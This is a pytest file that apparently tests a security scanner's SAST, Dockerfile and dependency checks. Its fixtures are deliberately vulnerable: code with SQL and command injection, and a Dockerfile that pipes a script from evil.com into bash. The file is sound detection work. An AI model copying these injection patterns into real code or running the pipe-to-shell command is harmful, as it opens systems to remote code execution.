import pytest
import asyncio
from backend.engine.sast.tree_sitter_analyzer import run_sast
from backend.engine.container.docker_scanner import run_container_scan
from backend.engine.sca.osv_scanner import run_sca

def test_tree_sitter_sql_injection():
    # Vulnerable code
    code = """
import sqlite3
def get_user(user_id):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    # This is a classic SQL injection using dynamic string formatting
    query = "SELECT * FROM users WHERE id = %s" % user_id
    cursor.execute(query)
    return cursor.fetchall()
"""
    findings = run_sast(code, language="python")
    assert len(findings) >= 1
    # Check if we caught SQL Injection
    sql_inj = [f for f in findings if f["title"] == "SQL Injection Risk"]
    assert len(sql_inj) > 0
    assert sql_inj[0]["severity"] == "CRITICAL"

def test_tree_sitter_command_injection():
    code = """
import os
def ping(host):
    os.system("ping -c 1 " + host)
"""
    findings = run_sast(code, language="python")
    assert len(findings) >= 1
    cmd_inj = [f for f in findings if f["title"] == "Command Injection Risk"]
    assert len(cmd_inj) > 0

def test_docker_scanner_root_and_latest():
    dockerfile = """
FROM python:latest
COPY . .
RUN curl http://evil.com/script.sh | bash
CMD ["python", "app.py"]
"""
    findings = run_container_scan(dockerfile)
    assert len(findings) >= 4
    
    titles = [f["title"] for f in findings]
    assert "Unpinned Base Image" in titles
    assert "Blind COPY directive" in titles
    assert "Unsafe Pipe to Shell" in titles
    assert "Running as Root Container" in titles

@pytest.mark.asyncio
async def test_osv_scanner():
    reqs = "requests==2.25.1\nDjango==3.1.4"
    findings = await run_sca(reqs)
    # Both of these old versions have known CVEs
    assert len(findings) > 0
    
    titles = [f["title"] for f in findings]
    assert any("Django" in t for t in titles)
    assert any("requests" in t for t in titles)
